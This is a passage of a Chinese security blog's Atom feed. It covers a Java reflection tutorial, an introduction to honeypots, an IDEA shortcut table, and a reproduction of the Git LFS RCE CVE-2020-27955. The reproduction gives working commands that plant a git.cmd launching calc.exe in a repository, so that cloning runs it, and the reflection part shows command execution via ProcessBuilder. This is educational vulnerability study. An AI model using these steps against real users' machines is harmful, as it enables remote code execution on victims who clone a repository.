ProcessBuilder Object了。</p><p>对于第二种构造函数，要怎么使用反射来执行呢？</p><p>这里就又涉及到java里的可变长参数（varargs）了；当定义函数的时候不确定参数数量时，就可以使用<code>...</code>这样的语法来表示这个函数的参数个数是可变的 ；对于可变参长数，java在编译的时候会编译成一个数组。</p><p>那么，对于反射来说，如果要获取的目标函数里包含可变长参数，只要认为它是数组就行了。<br>所以，将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>，就可以获取<code>ProcessBuilder</code>的第二种构造参数了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> </span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);    </span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure><p>在调用<code>newInstance</code>的时候，因为这个函数本身接受的是一个可变长参数，我们在传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加为一个二维数组</p><h3 id="5-2-如果一个方法或构造方法是私有方法，我们是否能执行他"><a href="#5-2-如果一个方法或构造方法是私有方法，我们是否能执行他" class="headerlink" title="5.2 如果一个方法或构造方法是私有方法，我们是否能执行他"></a>5.2 如果一个方法或构造方法是私有方法，我们是否能执行他</h3><p>答案是可以，这里可以使用<code>getDeclared</code>系列的反射，</p><ul><li><code>getDeclaredMethod</code>系列的方法获取的是当前类中声明的方法， 是实在写在这个类里的，包括私有方法， 但从父类继承来得就不包含了</li><li><code>getMethod</code>系列方法获取的是当前类中所有公共方法， 包括从父类中继承的方法</li></ul><h2 id="0x06-Java反射机制总结"><a href="#0x06-Java反射机制总结" class="headerlink" title="0x06 Java反射机制总结"></a>0x06 Java反射机制总结</h2><p>java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM</code>框架等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-Reflection-Reflection.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-Reflection-Reflection.md</a></li><li>p神知识星球的java安全漫谈</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反射&quot;&gt;&lt;a href=&quot;#java反射&quot; class=&quot;headerlink&quot; title=&quot;java反射&quot;&gt;&lt;/a&gt;java反射&lt;/h1&gt;&lt;h2 id=&quot;0x00-java反射简介&quot;&gt;&lt;a href=&quot;#0x00-java反射简介&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初识蜜罐技术</title>
    <link href="https://theth1nk3r.github.io/2021/02/26/%E5%88%9D%E8%AF%86%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/"/>
    <id>https://theth1nk3r.github.io/2021/02/26/%E5%88%9D%E8%AF%86%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/</id>
    <published>2021-02-26T01:51:00.000Z</published>
    <updated>2022-12-18T12:02:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识蜜罐技术"><a href="#初识蜜罐技术" class="headerlink" title="初识蜜罐技术"></a>初识蜜罐技术</h1><h3 id="0x01-何为蜜罐"><a href="#0x01-何为蜜罐" class="headerlink" title="0x01 何为蜜罐"></a>0x01 何为蜜罐</h3><p>蜜罐技术从本质上来讲就是一种对攻击方进行欺骗的技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途；通过布置一些诱饵主机、网络服务或者信息，诱使攻击者对他进行攻击，从而获取对攻击行为进行捕获和分析，了解攻击者使用的工具和方法，推测攻击意图和动机，能够使防御方清晰的了解他们面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p><p>蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于JSONP等方式来获取攻击者的画像。</p><p>蜜罐看似漏洞百出，却一切都在管理者的掌控之中；但是蜜罐也存在安全隐患，如果没有做好隔离，就会形成新的攻击源。</p><h3 id="0x02-蜜罐类别"><a href="#0x02-蜜罐类别" class="headerlink" title="0x02 蜜罐类别"></a>0x02 蜜罐类别</h3><p>根据蜜罐的部署目标不同，可以把蜜罐分类为<code>产品型</code>和<code>研究型</code>。</p><ul><li><code>产品型</code>侧重于分流真实的网络攻击流量，吸引攻击者把注意力和目标从真实系统转移到蜜罐，常见于非安全业务为主的公司和网络，不需要网管做很多工作。这一类的代表产品如：KFSensor, Specter, ManTrap。</li><li><code>研究型</code>蜜罐主要是由安全公司和安全研究人员部署，主要目的是收集攻击流量，研究攻击行为、了解攻击意图和提取攻击主体特征等，基于蜜罐来获得第一手、最真实的网络攻击数据并应用于安全防御产品的改进升级和测试，这需要大量时间和人力的投入。这一类的代表产品如：Gen II蜜网和Honeyd</li></ul><p>根据蜜罐的交互性差异，即根据攻击者在蜜罐中活动的交互性级别，蜜罐又可以细分为：<code>低交互型</code>、<code>高交互型</code>和<code>混合型</code>。其中：</p><ul><li>低交互型蜜罐通常表现为模拟部分网络服务和操作系统特征，只能捕获少量信息，容易部署，被彻底攻陷沦为肉鸡的风险较小。典型代表实例如：Specter, KFSensor, Dionaea, Honeyd。</li><li>高交互型蜜罐通常表现为提供真实的操作系统和服务，而不是模拟。攻击行为信息获取方面更有优势，可以捕获更丰富的信息。但这一类蜜罐通常也存在部署复杂，自身安全风险较高的缺陷。典型代表实例如：ManTrap, Gen II蜜⽹。</li></ul><p>除了上述两种分类方法，新型蜜罐的出现则更加丰富和完善了蜜罐的存在形式。例如：</p><ul><li>主动式蜜罐</li></ul><p>表现为使用了动态蜜罐和被动指纹识别技术。具备即插即用、自动调整等特性，被动指纹识别意味着不会在信息收集过程中主动发出探测数据，降低了被攻击者发现的概率。结合虚拟化技术，蜜罐的动态可配置性更加完备</p><ul><li>蜜场（HoneyFarm）<br><img src="/2021/02/26/%E5%88%9D%E8%AF%86%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/o_210226094035image001.png" alt="https://images.cnblogs.com/cnblogs_com/TheTh1nk3r/1937850/o_210226094035image001.png"></li></ul><p>如上图所示，蜜场又被称为蜜罐场（Honeypot Farm），这是一个由很多个蜜罐组成的蜜罐集群。通常被配置为真实网络中的高价值目标主机的替身主机，当网络中的入侵检测设备检测到高价值主机被攻击时会动态的将攻击流量重定向到蜜场中的预定义蜜罐。这样做的好处是不需要创建新的目标，直接使用已存在的目标，恶意的、未经授权的活动被透明的重定向到蜜罐，在攻击者无法察觉的情况下实现秘密监视和捕获攻击者在蜜罐中的活动，同时可以应用计算机取证技术。</p><ul><li>蜜信（HoneyToken）</li></ul><p>威胁不仅仅是针对信息系统，很多情况下攻击者的目的就是为了窃密，获取重要数据，针对信息本身。因此，蜜信指的是正常情况下不会使用和传输的一些诱饵数据。例如：数据库中设置的诱饵记录，伪造的弱口令用户数据等。一旦在系统中检测到蜜信数据被访问或在网络中蜜信数据被传输，则预示着攻击很可能已经发生，这时需要对蜜信的访问和传输行为进行密切监视跟踪。</p><h3 id="0x03-蜜罐识别"><a href="#0x03-蜜罐识别" class="headerlink" title="0x03 蜜罐识别"></a>0x03 蜜罐识别</h3><p>攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂且少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别</p><p>部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐</p><p>部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。</p><ol><li><p>协议响应特征的蜜罐<br><img src="/2021/02/26/%E5%88%9D%E8%AF%86%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/o_21022609405996b9ce9087a570f14b7f2fb8626e203b.png" alt="https://images.cnblogs.com/cnblogs_com/TheTh1nk3r/1937850/o_21022609405996b9ce9087a570f14b7f2fb8626e203b.png"></p></li><li><p>具有明显WEB特征的蜜罐<br><img src="/2021/02/26/%E5%88%9D%E8%AF%86%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/o_210226094042e3fd32d35478f70f83233ff657b6daef.png" alt="https://images.cnblogs.com/cnblogs_com/TheTh1nk3r/1937850/o_210226094042e3fd32d35478f70f83233ff657b6daef.png"></p></li></ol><h3 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h3><p><a href="https://c4pr1c3.github.io/cuc-ns/chap0x11/main.html">https://c4pr1c3.github.io/cuc-ns/chap0x11/main.html</a><br><a href="https://websec.readthedocs.io/zh/latest/defense/honeypot.html">https://websec.readthedocs.io/zh/latest/defense/honeypot.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初识蜜罐技术&quot;&gt;&lt;a href=&quot;#初识蜜罐技术&quot; class=&quot;headerlink&quot; title=&quot;初识蜜罐技术&quot;&gt;&lt;/a&gt;初识蜜罐技术&lt;/h1&gt;&lt;h3 id=&quot;0x01-何为蜜罐&quot;&gt;&lt;a href=&quot;#0x01-何为蜜罐&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IDEA常用快捷键大全</title>
    <link href="https://theth1nk3r.github.io/2021/02/20/IDEA%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%A7%E5%85%A8/"/>
    <id>https://theth1nk3r.github.io/2021/02/20/IDEA%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%A7%E5%85%A8/</id>
    <published>2021-02-20T00:18:00.000Z</published>
    <updated>2022-12-14T07:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDEA常用快捷键"><a href="#IDEA常用快捷键" class="headerlink" title="IDEA常用快捷键"></a>IDEA常用快捷键</h1><h2 id="0x01-⾃动代码"><a href="#0x01-⾃动代码" class="headerlink" title="0x01 ⾃动代码"></a>0x01 ⾃动代码</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Ctrl+Alt+O</td><td>优化导⼊的类和包</td></tr><tr><td>Alt+Insert</td><td>⽣成代码</td></tr><tr><td>Ctrl+Alt+T &#x2F; Alt+enter</td><td>生成try catch</td></tr><tr><td>CTRL+Alt+T</td><td>把选中的代码放入try{} if{} else{}中</td></tr><tr><td>Ctrl + O</td><td>重写⽅法</td></tr><tr><td>Ctrl + I</td><td>实现⽅法</td></tr><tr><td>Ctr+shift+U</td><td>⼤⼩写转化</td></tr><tr><td>ALT+回⻋</td><td>导⼊包,⾃动修正</td></tr><tr><td>ALT+&#x2F;</td><td>代码提⽰</td></tr><tr><td>CTRL+J</td><td>⾃动代码</td></tr><tr><td>Ctrl+Shift+J</td><td>整合两⾏为⼀⾏</td></tr><tr><td>CTRL+空格</td><td>代码提⽰</td></tr><tr><td>CTRL+SHIFT+SPACE</td><td>⾃动补全代码</td></tr><tr><td>CTRL+ALT+L</td><td>格式化代码</td></tr><tr><td>CTRL+ALT+I</td><td>⾃动缩进</td></tr><tr><td>CTRL+ALT+O</td><td>优化导⼊的类和包</td></tr><tr><td>CTRL+E</td><td>最近更改的代码</td></tr><tr><td>CTRL+ALT+SPACE</td><td>类名或接⼝名提⽰</td></tr><tr><td>CTRL+P</td><td>⽅法参数提⽰</td></tr><tr><td>CTRL+Q</td><td>可以看到当前⽅法的声明</td></tr><tr><td>Shift+F6</td><td>重构-重命名 (包、类、⽅法、变量、甚⾄注释等)</td></tr><tr><td>Ctrl+Alt+V</td><td>提取变量</td></tr></tbody></table><h2 id="0x02-查询快捷键"><a href="#0x02-查询快捷键" class="headerlink" title="0x02 查询快捷键"></a>0x02 查询快捷键</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Ctrl＋Shift＋Backspace</td><td>可以跳转到上次编辑的地</td></tr><tr><td>CTRL+ALT+ left&#x2F;right</td><td>前后导航编辑过的地⽅</td></tr><tr><td>ALT+7</td><td>靠左窗⼝显⽰当前⽂件的结构</td></tr><tr><td>Ctrl+F12</td><td>浮动显⽰当前⽂件的结构</td></tr><tr><td>ALT+F7</td><td>找到你的函数或者变量或者类的所有引⽤到的地⽅</td></tr><tr><td>CTRL+ALT+F7</td><td>找到你的函数或者变量或者类的所有引⽤到的地⽅</td></tr><tr><td>Ctrl+Shift+Alt+N</td><td>查找类中的⽅法或变量</td></tr><tr><td>双击SHIFT</td><td>在项⽬的所有⽬录查找⽂件</td></tr><tr><td>Ctrl+N</td><td>查找类</td></tr><tr><td>Ctrl+Shift+N</td><td>查找⽂件</td></tr><tr><td>CTRL+G</td><td>定位⾏</td></tr><tr><td>CTRL+F</td><td>在当前窗⼝查找⽂本</td></tr><tr><td>CTRL+SHIFT+F</td><td>在指定窗⼝查找⽂本</td></tr><tr><td>CTRL+R</td><td>在 当前窗⼝替换⽂本</td></tr><tr><td>CTRL+SHIFT+R</td><td>在指定窗⼝替换⽂本</td></tr><tr><td>ALT+SHIFT+C</td><td>查找修改的⽂件</td></tr><tr><td>CTRL+E</td><td>最近打开的⽂件</td></tr><tr><td>F3</td><td>向下查找关键字出现位置</td></tr><tr><td>SHIFT+F3</td><td>向上⼀个关键字出现位置</td></tr><tr><td>选中⽂本，按Alt+F3 ，⾼亮相同⽂本，F3逐个往下查找相同⽂本</td><td></td></tr><tr><td>F4</td><td>查找变量来源</td></tr><tr><td>CTRL+SHIFT+O</td><td>弹出显⽰查找内容</td></tr><tr><td>Ctrl+W</td><td>选中代码，连续按会有其他效果</td></tr><tr><td>F2 或Shift+F2</td><td>⾼亮错误或警告快速定位</td></tr><tr><td>Ctrl+Up&#x2F;Down</td><td>光标跳转到第⼀⾏或最后⼀⾏下</td></tr><tr><td>Ctrl+B</td><td>快速打开光标处的类或⽅法</td></tr><tr><td>CTRL+ALT+B</td><td>找所有的⼦类</td></tr><tr><td>CTRL+SHIFT+B</td><td>找变量的类</td></tr><tr><td>Ctrl+Shift+上下键</td><td>上下移动代码</td></tr><tr><td>Ctrl+Alt+ left&#x2F;right</td><td>返回⾄上次浏览的位置</td></tr><tr><td>Ctrl+X</td><td>删除⾏</td></tr><tr><td>Ctrl+D</td><td>复制⾏</td></tr><tr><td>Ctrl+&#x2F; 或 Ctrl+Shift+&#x2F;</td><td>注释（&#x2F;&#x2F; 或者&#x2F;<em>…</em>&#x2F; ）</td></tr><tr><td>Ctrl+H</td><td>显⽰类结构图</td></tr><tr><td>Ctrl+Q</td><td>显⽰注释⽂档</td></tr><tr><td>Alt+F1</td><td>查找代码所在位置</td></tr><tr><td>Alt+1</td><td>快速打开或隐藏⼯程⾯板</td></tr><tr><td>Alt+ left&#x2F;right</td><td>切换代码视图</td></tr><tr><td>ALT+ ↑&#x2F;↓</td><td>在⽅法间快速移动定位</td></tr><tr><td>CTRL+ALT+ left&#x2F;right</td><td>前后导航编辑过的地⽅</td></tr><tr><td>Ctrl＋Shift＋Backspace</td><td>可以跳转到上次编辑的地</td></tr><tr><td>Alt+6</td><td>查找TODO</td></tr></tbody></table><h2 id="0x03-调试快捷键"><a href="#0x03-调试快捷键" class="headerlink" title="0x03 调试快捷键"></a>0x03 调试快捷键</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>其实常⽤的 就是F8 F7 F9，最值得⼀提的 就是Drop Frame 可以让运⾏过的代码从头再来：</td><td></td></tr><tr><td>alt+F8</td><td>debug时选中查看值</td></tr><tr><td>Alt+Shift+F9</td><td>选择 Debug</td></tr><tr><td>Alt+Shift+F10</td><td>选择 Run</td></tr><tr><td>Ctrl+Shift+F9</td><td>编译</td></tr><tr><td>Ctrl+Shift+F8</td><td>查看断点</td></tr><tr><td>F7</td><td>步⼊</td></tr><tr><td>Shift+F7</td><td>智能步⼊</td></tr><tr><td>Alt+Shift+F7</td><td>强制步⼊</td></tr><tr><td>F8</td><td>步过</td></tr><tr><td>Shift+F8</td><td>步出</td></tr><tr><td>Alt+Shift+F8</td><td>强制步过</td></tr><tr><td>Alt+F9</td><td>运⾏⾄光标处</td></tr><tr><td>Ctrl+Alt+F9</td><td>强制运⾏⾄光标处</td></tr><tr><td>F9</td><td>恢复程序</td></tr><tr><td>Alt+F10</td><td>定位到断点</td></tr></tbody></table><h2 id="0x04-重构"><a href="#0x04-重构" class="headerlink" title="0x04 重构"></a>0x04 重构</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Ctrl+Alt+Shift+T</td><td>弹出重构菜单</td></tr><tr><td>Shift+F6</td><td>重命名</td></tr><tr><td>F6</td><td>移动</td></tr><tr><td>F5</td><td>复制</td></tr><tr><td>Alt+Delete</td><td>安全删除</td></tr><tr><td>Ctrl+Alt+N</td><td>内联</td></tr></tbody></table><h2 id="0x05-svn快捷键"><a href="#0x05-svn快捷键" class="headerlink" title="0x05 svn快捷键"></a>0x05 svn快捷键</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>ctrl+k</td><td>提交代码到SVN</td></tr><tr><td>ctrl+t</td><td>更新代码</td></tr></tbody></table><h2 id="0x06-其他快捷键"><a href="#0x06-其他快捷键" class="headerlink" title="0x06 其他快捷键"></a>0x06 其他快捷键</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>SHIFT+ENTER</td><td>另起⼀⾏</td></tr><tr><td>CTRL+Z</td><td>倒退(撤销)</td></tr><tr><td>CTRL+SHIFT+Z</td><td>向前(取消撤销)</td></tr><tr><td>CTRL+ALT+F12</td><td>资源管理器打开⽂件夹</td></tr><tr><td>ALT+F1</td><td>查找⽂件所在⽬录位置</td></tr><tr><td>SHIFT+ALT+INSERT</td><td>竖编辑模式</td></tr><tr><td>CTRL+F4</td><td>关闭当前窗⼝</td></tr><tr><td>Ctrl+Alt+V</td><td>可以引⼊变量。例如：new String(); ⾃动导⼊变量定义</td></tr><tr><td>Ctrl+~</td><td>快速切换⽅案（界⾯外观、代码⻛格、快捷键映射等菜单）</td></tr><tr><td>CIRL+U</td><td>大小写切换</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDEA常用快捷键&quot;&gt;&lt;a href=&quot;#IDEA常用快捷键&quot; class=&quot;headerlink&quot; title=&quot;IDEA常用快捷键&quot;&gt;&lt;/a&gt;IDEA常用快捷键&lt;/h1&gt;&lt;h2 id=&quot;0x01-⾃动代码&quot;&gt;&lt;a href=&quot;#0x01-⾃动代码&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-27955复现</title>
    <link href="https://theth1nk3r.github.io/2021/01/05/CVE-2020-27955%E5%A4%8D%E7%8E%B0/"/>
    <id>https://theth1nk3r.github.io/2021/01/05/CVE-2020-27955%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-05T04:38:00.000Z</published>
    <updated>2022-12-18T12:08:52.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2020-27955-Git-LFS-RCE"><a href="#CVE-2020-27955-Git-LFS-RCE" class="headerlink" title="CVE-2020-27955(Git-LFS RCE)"></a>CVE-2020-27955(Git-LFS RCE)</h2><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>Git LFS 是 Github 开发的一个 Git 的扩展，用于实现 Git 对大文件的支持</p><h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h3><p>Git-LFS（git-lfs）&lt;&#x3D; 2.12</p><p>一些受影响的产品包括Git，GitHub CLI，GitHub Desktop，Visual Studio，GitKraden，SmartGit，Sourcetree等</p><p>该漏洞影响仅windows平台</p><h3 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​下载安装git-lfs小于2.12的版本</p><p>​（该poc需在单独的Linux系统上（以防止在提交时在localhost上执行））</p><p>​只需添加名为以下文件的可执行文件，即可在恶意仓库的根目录中创建后门：</p><ul><li>git.bat </li><li>git.exe </li><li>git.cmd </li><li>git.vbs</li></ul><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>​1 创建一个git仓库</p><p><img src="/2021/01/05/CVE-2020-27955%E5%A4%8D%E7%8E%B0/2246609-20210105205027059-745795944.png"></p><ol start="2"><li>clone到本地并将可执行文件添加到仓库，</li></ol><p><img src="/2021/01/05/CVE-2020-27955%E5%A4%8D%E7%8E%B0/2246609-20210105205113021-1106261899.png"></p><ol start="3"><li>在目标机器上进行git clone，此时，恶意文件将会下载到本地，并由git-lfs扩展自动执行，无需交互</li></ol><p><img src="/2021/01/05/CVE-2020-27955%E5%A4%8D%E7%8E%B0/2246609-20210105205133039-1285461266.png"></p><ol start="4"><li>相关命令</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/attacker/poc.git</span><br><span class="line">echo calc.exe &gt; git.cmd </span><br><span class="line">git lfs track &quot;*.dat&quot;</span><br><span class="line">echo &quot;test&quot; &gt; large.dat</span><br><span class="line">git add -A </span><br><span class="line">git commit -m &quot;poc&quot;</span><br><span class="line">git push -u origin master -f</span><br></pre></td></tr></table></figure><h3 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h3><p>更新到最新版软件</p><h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a href="https://medium.com/bugbountywriteup/git-lfs-exploit-for-remote-code-execution-cve-2020-27955-e8f4786163c3">https://medium.com/bugbountywriteup/git-lfs-exploit-for-remote-code-execution-cve-2020-27955-e8f4786163c3</a></p><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2020-27955-Git-LFS-RCE&quot;&gt;&lt;a href=&quot;#CVE-2020-27955-Git-LFS-RCE&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-27955(Git-LFS RCE)&quot;&gt;&lt;/a&gt;CVE-202</summary>
      
    
    
    
    
  </entry>
  
</feed>
